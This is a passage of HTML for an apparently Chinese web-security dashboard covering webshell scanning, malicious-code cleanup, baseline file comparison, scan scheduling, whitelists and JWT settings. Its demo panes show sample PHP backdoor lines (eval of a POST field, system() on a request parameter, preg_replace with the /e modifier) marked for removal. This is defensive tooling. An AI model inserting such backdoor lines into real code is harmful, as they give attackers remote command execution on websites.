<span style="color:var(--text4)">48</span>
<span style="color:var(--text4)">66</span> <span style="color:#c084fc">$regex = '/.*/e';</span>
<span style="color:var(--text4)">67</span> <span style="color:#fb923c;background:rgba(249,115,22,.1);padding:2px 4px;border-radius:3px">preg_replace($regex, $_GET['x'], '');</span>
<span style="color:var(--text4)">68</span>
<span style="color:var(--text4)">88</span> <span style="color:#c084fc">if(isset($_REQUEST['action'])){</span>
<span style="color:var(--text4)">89</span> <span style="color:#f87171;background:rgba(239,68,68,.15);padding:2px 4px;border-radius:3px">    system($_REQUEST['action']);</span>
<span style="color:var(--text4)">90</span> <span style="color:var(--text2">    echo 'Done';</span>
<span style="color:var(--text4)">91</span> <span style="color:#c084fc">}</span></pre>
              </div>
              <div style="margin-top:12px;display:flex;gap:8px">
                <button class="btn btn-ghost" onclick="viewFullCode()">📄 查看完整代码</button>
                <button class="btn btn-danger" onclick="quarantineAnalyzedFile()">🚫 隔离文件</button>
                <button class="btn btn-success" onclick="addToWhitelistFromAnalyze()">✅ 加入白名单</button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- 精准切割功能 -->
      <div class="table-card collapsible" id="preciseCutCard">
        <div class="card-head" onclick="toggleCollapse('preciseCutCard')">
          <div class="card-title"><span class="dot" style="background:var(--orange)"></span>✂️ 精准切割（智能清理）</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div style="padding:12px 16px;background:linear-gradient(135deg,rgba(249,115,22,.08),rgba(239,68,68,.08));border-radius:10px;margin-bottom:16px;border:1px solid rgba(249,115,22,.2)">
            <div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px">💡 智能切割说明</div>
            <div style="font-size:12px;color:var(--text3);line-height:1.6">自动识别恶意代码块并安全清除，保留正常业务代码。基于基线对比 + 语义分析双重校验，确保不误删正常代码。</div>
          </div>
          <div class="add-row">
            <input type="text" id="cutFilePath" placeholder="输入文件路径，如: /var/www/html/wp-content/themes/index.php" style="flex:1">
            <button class="btn btn-primary" onclick="previewCut()">👁️ 预览切割</button>
          </div>
          <div id="cutPreviewArea" style="display:none">
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
              <div>
                <div style="font-size:12px;font-weight:600;color:var(--text2);margin-bottom:8px;display:flex;align-items:center;gap:8px">
                  <span class="dot" style="width:6px;height:6px;border-radius:50%;background:var(--red)"></span>原始代码（标记待删除行）
                </div>
                <div style="background:rgba(0,0,0,.4);border-radius:10px;padding:14px;font-family:'JetBrains Mono','SF Mono',Consolas,monospace;font-size:11px;line-height:1.8;overflow-x:auto;max-height:400px;overflow-y:auto;border:1px solid var(--border)">
                  <pre id="cutOriginalCode" style="margin:0;color:var(--text2)"><span style="color:var(--text4)">1</span>  <span style="color:#c084fc">&lt;?php</span>
<span style="color:var(--text4)">2</span>  <span style="color:var(--text3)">// Normal WordPress header</span>
<span style="color:var(--text4)">3</span>  <span style="color:#c084fc">define('WP_USE_THEMES', true);</span>
<span style="color:var(--text4)">4</span>  <span style="color:var(--text2)">require('./wp-blog-header.php');</span>
<span style="color:var(--text4)">5</span>
<span style="color:var(--text4)">6</span>  <span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:var(--text4)"><span style="color:var(--text4)">6</span>  </span><span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:#f87171">$bad = $_POST['shell'];</span>
<span style="color:var(--text4)">7</span>  <span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:var(--text4)"><span style="color:var(--text4)">7</span>  </span><span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:#f87171">if($bad){ eval($bad); }</span>
<span style="color:var(--text4)">8</span>  <span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:var(--text4)"><span style="color:var(--text4)">8</span>  </span><span style="background:rgba(239,68,68,.15);text-decoration:line-through;color:#f87171">// Backdoor</span>
<span style="color:var(--text4)">9</span>
<span style="color:var(--text4)">10</span> <span style="color:var(--text3)">// Normal template code</span>
<span style="color:var(--text4)">11</span> <span style="color:#c084fc">get_header();</span>
<span style="color:var(--text4)">12</span> <span style="color:var(--text2)">if ( have_posts() ) :</span>
<span style="color:var(--text4)">13</span> <span style="color:var(--text2)">    while ( have_posts() ) : the_post();</span>
<span style="color:var(--text4)">14</span> <span style="color:var(--text2)">        the_content();</span>
<span style="color:var(--text4)">15</span> <span style="color:var(--text2)">    endwhile;</span>
<span style="color:var(--text4)">16</span> <span style="color:var(--text2)">endif;</span>
<span style="color:var(--text4)">17</span> <span style="color:#c084fc">get_footer();</span></pre>
                </div>
              </div>
              <div>
                <div style="font-size:12px;font-weight:600;color:var(--text2);margin-bottom:8px;display:flex;align-items:center;gap:8px">
                  <span class="dot" style="width:6px;height:6px;border-radius:50%;background:var(--green)"></span>切割后代码
                </div>
                <div style="background:rgba(0,0,0,.4);border-radius:10px;padding:14px;font-family:'JetBrains Mono','SF Mono',Consolas,monospace;font-size:11px;line-height:1.8;overflow-x:auto;max-height:400px;overflow-y:auto;border:1px solid rgba(16,185,129,.3)">
                  <pre id="cutCleanCode" style="margin:0;color:var(--text2)"><span style="color:var(--text4)">1</span>  <span style="color:#c084fc">&lt;?php</span>
<span style="color:var(--text4)">2</span>  <span style="color:var(--text3)">// Normal WordPress header</span>
<span style="color:var(--text4)">3</span>  <span style="color:#c084fc">define('WP_USE_THEMES', true);</span>
<span style="color:var(--text4)">4</span>  <span style="color:var(--text2)">require('./wp-blog-header.php');</span>
<span style="color:var(--text4)">5</span>
<span style="color:var(--text4)">6</span>
<span style="color:var(--text4)">7</span>  <span style="color:var(--text3)">// Normal template code</span>
<span style="color:var(--text4)">8</span>  <span style="color:#c084fc">get_header();</span>
<span style="color:var(--text4)">9</span>  <span style="color:var(--text2)">if ( have_posts() ) :</span>
<span style="color:var(--text4)">10</span> <span style="color:var(--text2)">    while ( have_posts() ) : the_post();</span>
<span style="color:var(--text4)">11</span> <span style="color:var(--text2)">        the_content();</span>
<span style="color:var(--text4)">12</span> <span style="color:var(--text2)">    endwhile;</span>
<span style="color:var(--text4)">13</span> <span style="color:var(--text2)">endif;</span>
<span style="color:var(--text4)">14</span> <span style="color:#c084fc">get_footer();</span></pre>
                </div>
              </div>
            </div>
            <div style="padding:12px 16px;background:rgba(16,185,129,.08);border-radius:10px;margin-bottom:16px;border:1px solid rgba(16,185,129,.2);display:flex;justify-content:space-between;align-items:center">
              <div>
                <span style="font-size:12px;color:var(--text2)">检测到 <span style="color:var(--red);font-weight:700">3 行</span> 恶意代码，切割后文件大小 <span style="color:var(--green);font-weight:700">减少 482 字节</span></span>
              </div>
              <span class="tag green">安全可执行</span>
            </div>
            <div style="display:flex;gap:8px;justify-content:flex-end">
              <button class="btn btn-ghost" onclick="cancelCut()">取消</button>
              <button class="btn btn-ghost" onclick="downloadBackup()">💾 下载备份</button>
              <button class="btn btn-primary" onclick="applyCut()">✅ 应用切割</button>
            </div>
          </div>
        </div>
      </div>

      <!-- 基线对比 -->
      <div class="table-card collapsible" id="baselineCompareCard">
        <div class="card-head" onclick="toggleCollapse('baselineCompareCard')">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>📊 基线对比</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
            <div class="semantic-tab active" data-baseline-tab="count" onclick="setBaselineTab('count')">文件数量</div>
            <div class="semantic-tab" data-baseline-tab="size" onclick="setBaselineTab('size')">文件大小</div>
            <div class="semantic-tab" data-baseline-tab="added" onclick="setBaselineTab('added')">新增文件</div>
            <div class="semantic-tab" data-baseline-tab="modified" onclick="setBaselineTab('modified')">修改文件</div>
            <div class="semantic-tab" data-baseline-tab="deleted" onclick="setBaselineTab('deleted')">删除文件</div>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">基线时间</label>
              <select id="baselineTimeSelect" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="2024-01-10">2024-01-10 08:00:00（初始基线）</option>
                <option value="2024-01-12">2024-01-12 12:30:00</option>
                <option value="2024-01-15" selected>2024-01-15 09:15:00（最新基线）</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">对比时间</label>
              <select id="compareTimeSelect" style="width:100%;padding:8px 12px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="now" selected>当前时间</option>
                <option value="2024-01-16">2024-01-16 00:00:00</option>
                <option value="2024-01-17">2024-01-17 00:00:00</option>
              </select>
            </div>
          </div>
          <div class="kpi-grid" style="grid-template-columns:repeat(3,1fr);margin-bottom:16px">
            <div class="kpi-card" style="padding:16px;--card-grad:var(--grad-3)">
              <div class="kpi-icon" style="font-size:16px;width:32px;height:32px">📄</div>
              <div class="kpi-value" style="font-size:24px;margin-top:8px">12</div>
              <div class="kpi-label">新增文件</div>
            </div>
            <div class="kpi-card" style="padding:16px;--card-grad:var(--grad-4)">
              <div class="kpi-icon" style="font-size:16px;width:32px;height:32px">✏️</div>
              <div class="kpi-value" style="font-size:24px;margin-top:8px">28</div>
              <div class="kpi-label">修改文件</div>
            </div>
            <div class="kpi-card" style="padding:16px;--card-grad:var(--grad-2)">
              <div class="kpi-icon" style="font-size:16px;width:32px;height:32px">🗑️</div>
              <div class="kpi-value" style="font-size:24px;margin-top:8px">5</div>
              <div class="kpi-label">删除文件</div>
            </div>
          </div>
          <div>
            <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">文件列表</div>
            <table>
              <thead><tr><th>文件名</th><th>状态</th><th>大小变化</th><th>修改时间</th><th>操作</th></tr></thead>
              <tbody id="baselineCompareBody">
                <tr>
                  <td style="font-family:monospace;font-size:11px">/wp-content/plugins/bad-plugin/evil.php</td>
                  <td><span class="tag red">新增</span></td>
                  <td style="color:var(--red)">+45.2 KB</td>
                  <td style="font-size:11px">2024-01-16 14:32:18</td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewDiff('evil.php')">查看差异</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="addToWhitelist('evil.php')">白名单</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteFile('evil.php')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">/wp-content/themes/index.php</td>
                  <td><span class="tag yellow">修改</span></td>
                  <td style="color:var(--yellow)">+482 B</td>
                  <td style="font-size:11px">2024-01-16 10:15:42</td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewDiff('index.php')">查看差异</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="restoreFileBaseline('index.php')">恢复</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="addToWhitelist('index.php')">白名单</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">/wp-admin/backup.sql</td>
                  <td><span class="tag red">新增</span></td>
                  <td style="color:var(--red)">+2.3 MB</td>
                  <td style="font-size:11px">2024-01-16 09:45:33</td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewDiff('backup.sql')">查看差异</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="addToWhitelist('backup.sql')">白名单</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteFile('backup.sql')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">/wp-includes/version.php</td>
                  <td><span class="tag yellow">修改</span></td>
                  <td style="color:var(--green)">-128 B</td>
                  <td style="font-size:11px">2024-01-15 18:22:10</td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewDiff('version.php')">查看差异</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="restoreFileBaseline('version.php')">恢复</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="addToWhitelist('version.php')">白名单</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">/wp-content/uploads/shell.php</td>
                  <td><span class="tag red">新增</span></td>
                  <td style="color:var(--red)">+12.8 KB</td>
                  <td style="font-size:11px">2024-01-15 22:18:55</td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewDiff('shell.php')">查看差异</button>
                    <button class="btn btn-success" style="padding:3px 8px;font-size:10px" onclick="addToWhitelist('shell.php')">白名单</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteFile('shell.php')">删除</button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <!-- 扫描任务管理 -->
      <div class="table-card collapsible" id="scanTaskCard">
        <div class="card-head" onclick="toggleCollapse('scanTaskCard')">
          <div class="card-title"><span class="dot" style="background:var(--green)"></span>🔄 扫描任务</div>
          <div class="collapse-icon">▼</div>
        </div>
        <div class="card-body">
          <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;align-items:center">
            <button class="btn btn-primary" onclick="scanNow()">🔍 立即扫描</button>
            <div style="flex:1"></div>
            <div style="display:flex;align-items:center;gap:10px">
              <span style="font-size:12px;color:var(--text2)">定时扫描</span>
              <label class="switch"><input type="checkbox" id="scheduleScanSwitch" onchange="saveScanSchedule()" checked><span class="slider"></span></label>
            </div>
          </div>
          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:16px;padding:16px;background:rgba(148,163,184,.03);border-radius:12px;border:1px solid var(--border)">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:6px">扫描频率</label>
              <select id="scanFrequency" onchange="saveScanSchedule()" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="daily">每天</option>
                <option value="weekly" selected>每周</option>
                <option value="monthly">每月</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:6px">扫描时间</label>
              <input type="time" id="scanTime" value="03:00" onchange="saveScanSchedule()" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:6px">扫描星期</label>
              <select id="scanWeekday" onchange="saveScanSchedule()" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="1">周一</option>
                <option value="2">周二</option>
                <option value="3">周三</option>
                <option value="4">周四</option>
                <option value="5" selected>周五</option>
                <option value="6">周六</option>
                <option value="0">周日</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:6px">扫描范围</label>
              <select id="scanScope" onchange="saveScanSchedule()" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="all" selected>全部目录</option>
                <option value="webroot">Web 根目录</option>
                <option value="custom">指定目录</option>
              </select>
            </div>
          </div>
          <div id="customScanDirRow" style="display:none;margin-bottom:16px">
            <div class="add-row">
              <input type="text" id="customScanDir" placeholder="输入自定义扫描目录，多个用逗号分隔" style="flex:1">
              <button class="btn btn-primary" onclick="saveScanSchedule()">保存</button>
            </div>
          </div>
          <div>
            <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">历史任务</div>
            <table>
              <thead><tr><th>任务ID</th><th>类型</th><th>开始时间</th><th>耗时</th><th>扫描文件数</th><th>发现威胁</th><th>状态</th><th>操作</th></tr></thead>
              <tbody id="scanTaskBody">
                <tr>
                  <td style="font-family:monospace;font-size:11px">#SCAN-20240117001</td>
                  <td><span class="tag cyan">手动扫描</span></td>
                  <td style="font-size:11px">2024-01-17 10:23:45</td>
                  <td style="font-size:11px">45秒</td>
                  <td>12,458</td>
                  <td style="color:var(--red);font-weight:600">7</td>
                  <td><span class="tag green">已完成</span></td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewScanReport('SCAN-20240117001')">查看报告</button>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="rescan('SCAN-20240117001')">重新扫描</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteScanTask('SCAN-20240117001')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">#SCAN-20240116003</td>
                  <td><span class="tag purple">定时扫描</span></td>
                  <td style="font-size:11px">2024-01-16 03:00:02</td>
                  <td style="font-size:11px">52秒</td>
                  <td>12,394</td>
                  <td style="color:var(--red);font-weight:600">3</td>
                  <td><span class="tag green">已完成</span></td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewScanReport('SCAN-20240116003')">查看报告</button>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="rescan('SCAN-20240116003')">重新扫描</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteScanTask('SCAN-20240116003')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">#SCAN-20240115002</td>
                  <td><span class="tag purple">定时扫描</span></td>
                  <td style="font-size:11px">2024-01-15 03:00:05</td>
                  <td style="font-size:11px">48秒</td>
                  <td>12,350</td>
                  <td style="color:var(--yellow);font-weight:600">0</td>
                  <td><span class="tag green">已完成</span></td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewScanReport('SCAN-20240115002')">查看报告</button>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="rescan('SCAN-20240115002')">重新扫描</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteScanTask('SCAN-20240115002')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">#SCAN-20240114001</td>
                  <td><span class="tag orange">基线扫描</span></td>
                  <td style="font-size:11px">2024-01-14 15:30:20</td>
                  <td style="font-size:11px">1分20秒</td>
                  <td>12,289</td>
                  <td style="color:var(--green);font-weight:600">0</td>
                  <td><span class="tag green">已完成</span></td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewScanReport('SCAN-20240114001')">查看报告</button>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="rescan('SCAN-20240114001')">重新扫描</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteScanTask('SCAN-20240114001')">删除</button>
                  </td>
                </tr>
                <tr>
                  <td style="font-family:monospace;font-size:11px">#SCAN-20240113001</td>
                  <td><span class="tag cyan">手动扫描</span></td>
                  <td style="font-size:11px">2024-01-13 09:12:33</td>
                  <td style="font-size:11px">-</td>
                  <td>-</td>
                  <td>-</td>
                  <td><span class="tag red">失败</span></td>
                  <td>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="viewScanReport('SCAN-20240113001')">查看报告</button>
                    <button class="btn" style="padding:3px 8px;font-size:10px" onclick="rescan('SCAN-20240113001')">重新扫描</button>
                    <button class="btn btn-danger" style="padding:3px 8px;font-size:10px" onclick="deleteScanTask('SCAN-20240113001')">删除</button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <!-- 扫描历史 -->
      <div class="table-card">
        <div class="card-head"><div class="card-title"><span class="dot" style="background:var(--green)"></span>最近扫描历史</div></div>
        <table>
          <thead><tr><th>扫描时间</th><th>扫描文件数</th><th>恶意文件数</th><th>隔离数</th><th>耗时</th></tr></thead>
          <tbody id="sandHistoryTable"><tr><td colspan="5" style="text-align:center;color:var(--text4);padding:30px">加载中...</td></tr></tbody>
        </table>
      </div>
    </div>

    <!-- ===== 误报中心 ===== -->
    <div class="page" id="page-false-positive">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-1);--icon-bg:rgba(6,182,212,.15)">
          <div class="kpi-top"><div class="kpi-icon">🔗</div><span class="kpi-trend down">-5%</span></div>
          <div class="kpi-value" id="fpUrlCount">0</div>
          <div class="kpi-label">URL 白名单数量</div>
          <div class="kpi-sub">已配置的 URL 白名单</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3);--icon-bg:rgba(16,185,129,.15)">
          <div class="kpi-top"><div class="kpi-icon">📝</div><span class="kpi-trend down">-3%</span></div>
          <div class="kpi-value" id="fpParamCount">0</div>
          <div class="kpi-label">参数白名单数量</div>
          <div class="kpi-sub">已配置的参数白名单</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2);--icon-bg:rgba(139,92,246,.15)">
          <div class="kpi-top"><div class="kpi-icon">📋</div><span class="kpi-trend up">+2%</span></div>
          <div class="kpi-value" id="fpRuleExemptCount">0</div>
          <div class="kpi-label">规则豁免数量</div>
          <div class="kpi-sub">已豁免的防护规则</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-4);--icon-bg:rgba(239,68,68,.15)">
          <div class="kpi-top"><div class="kpi-icon">📨</div><span class="kpi-trend up">+12%</span></div>
          <div class="kpi-value" id="fpMonthlyCount">0</div>
          <div class="kpi-label">本月误报处理数</div>
          <div class="kpi-sub">已确认的误报工单</div>
        </div>
      </div>

      <!-- URL 白名单卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>URL 白名单</div>
          <div class="card-actions">
            <button class="btn btn-ghost" onclick="fpUrlExport()">📤 导出</button>
            <button class="btn btn-ghost" onclick="fpUrlImport()">📥 导入</button>
            <input type="file" id="fpUrlImportFile" accept=".json,.csv" style="display:none" onchange="fpUrlImportFile(this)">
          </div>
        </div>
        <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(148,163,184,.02)">
          <div style="display:grid;grid-template-columns:2fr 1fr 2fr 1fr;gap:10px;align-items:end">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">URL 路径</label>
              <input type="text" id="fpUrlInput" placeholder="/api/example/*" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">匹配类型</label>
              <select id="fpUrlType" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
                <option value="exact">完全匹配</option>
                <option value="prefix">前缀匹配</option>
                <option value="regex">正则匹配</option>
              </select>
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">备注说明</label>
              <input type="text" id="fpUrlNote" placeholder="业务系统正常接口" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <button class="btn btn-primary" onclick="fpUrlAdd()" style="width:100%">➕ 添加白名单</button>
            </div>
          </div>
        </div>
        <table>
          <thead><tr><th>URL 路径</th><th>匹配类型</th><th>备注</th><th>添加时间</th><th>操作</th></tr></thead>
          <tbody id="fpUrlBody"></tbody>
        </table>
      </div>

      <!-- 参数白名单卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--green)"></span>参数白名单</div>
          <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
            <input type="checkbox" id="fpGlobalParam" onchange="fpToggleGlobalParam()" style="cursor:pointer">
            启用全局参数白名单
          </label>
        </div>
        <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(148,163,184,.02)">
          <div style="display:grid;grid-template-columns:2fr 1.5fr 2fr 1fr;gap:10px;align-items:end">
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">URL 路径（留空为全局）</label>
              <input type="text" id="fpParamUrl" placeholder="/api/submit 或留空" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">参数名</label>
              <input type="text" id="fpParamName" placeholder="content / id 等" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <label style="font-size:12px;color:var(--text3);display:block;margin-bottom:4px">说明</label>
              <input type="text" id="fpParamDesc" placeholder="富文本编辑器内容" style="width:100%;padding:7px 10px;background:rgba(148,163,184,.06);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:12px;outline:none">
            </div>
            <div>
              <button class="btn btn-primary" onclick="fpParamAdd()" style="width:100%">➕ 添加参数</button>
            </div>
          </div>
        </div>
        <table>
          <thead><tr><th>URL 路径</th><th>参数名</th><th>说明</th><th>添加时间</th><th>操作</th></tr></thead>
          <tbody id="fpParamBody"></tbody>
        </table>
      </div>

      <!-- 规则豁免卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--purple)"></span>规则豁免</div>
          <button class="btn btn-primary" onclick="fpRuleAdd()">➕ 添加豁免</button>
        </div>
        <table>
          <thead><tr><th>规则 ID</th><th>豁免原因</th><th>生效范围</th><th>添加时间</th><th>操作</th></tr></thead>
          <tbody id="fpRuleBody"></tbody>
        </table>
      </div>

      <!-- 误报工单 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--orange)"></span>误报工单</div>
          <div class="card-actions">
            <span class="chip active">全部</span>
            <span class="chip">待处理</span>
            <span class="chip">已确认</span>
            <span class="chip">已驳回</span>
          </div>
        </div>
        <table>
          <thead><tr><th>工单编号</th><th>提交时间</th><th>URL</th><th>规则类型</th><th>提交者</th><th>状态</th><th>操作</th></tr></thead>
          <tbody id="fpTicketBody"></tbody>
        </table>
      </div>
    </div>

    <!-- ===== API 安全 ===== -->
    <div class="page" id="page-api-security">
      <div class="kpi-grid">
        <div class="kpi-card" style="--card-grad:var(--grad-1);--icon-bg:rgba(6,182,212,.15)">
          <div class="kpi-top"><div class="kpi-icon">🔐</div><span class="kpi-trend up">+8%</span></div>
          <div class="kpi-value" id="apiProtectedCount">0</div>
          <div class="kpi-label">受保护 API 数</div>
          <div class="kpi-sub">纳入安全防护的接口</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-3);--icon-bg:rgba(16,185,129,.15)">
          <div class="kpi-top"><div class="kpi-icon">📊</div><span class="kpi-trend up">+15%</span></div>
          <div class="kpi-value" id="apiTodayReq">0</div>
          <div class="kpi-label">今日 API 请求数</div>
          <div class="kpi-sub">所有 API 接口调用</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-4);--icon-bg:rgba(239,68,68,.15)">
          <div class="kpi-top"><div class="kpi-icon">🛡️</div><span class="kpi-trend down">-10%</span></div>
          <div class="kpi-value" id="apiBlockedCount">0</div>
          <div class="kpi-label">拦截 API 攻击数</div>
          <div class="kpi-sub">已拦截的恶意请求</div>
        </div>
        <div class="kpi-card" style="--card-grad:var(--grad-2);--icon-bg:rgba(139,92,246,.15)">
          <div class="kpi-top"><div class="kpi-icon">⚡</div><span class="kpi-trend down">-3ms</span></div>
          <div class="kpi-value" id="apiAvgLatency">0ms</div>
          <div class="kpi-label">API 平均响应延迟</div>
          <div class="kpi-sub">含 WAF 检测耗时</div>
        </div>
      </div>

      <!-- JWT 安全卡片 -->
      <div class="table-card">
        <div class="card-head">
          <div class="card-title"><span class="dot" style="background:var(--cyan)"></span>JWT 安全</div>
          <label class="switch">
            <input type="checkbox" id="apiJwtEnabled" onchange="apiSaveConfig()">
            <span class="slider"></span>
          </label>
        </div>
        <div style="padding:16px">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
            <div>
              <div style="font-size:13px;font-weight:600;color:var(--text2);margin-bottom:10px">允许的签名算法</div>
              <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="HS256" onchange="apiSaveConfig()" checked> HS256
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="HS384" onchange="apiSaveConfig()"> HS384
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="HS512" onchange="apiSaveConfig()"> HS512
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="RS256" onchange="apiSaveConfig()" checked> RS256
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="RS384" onchange="apiSaveConfig()"> RS384
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="RS512" onchange="apiSaveConfig()"> RS512
                </label>
                <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--text2);cursor:pointer">
                  <input type="checkbox" class="api-jwt-algo" value="ES256" onchange="apiSaveConfig()" checked> ES256
                </label>
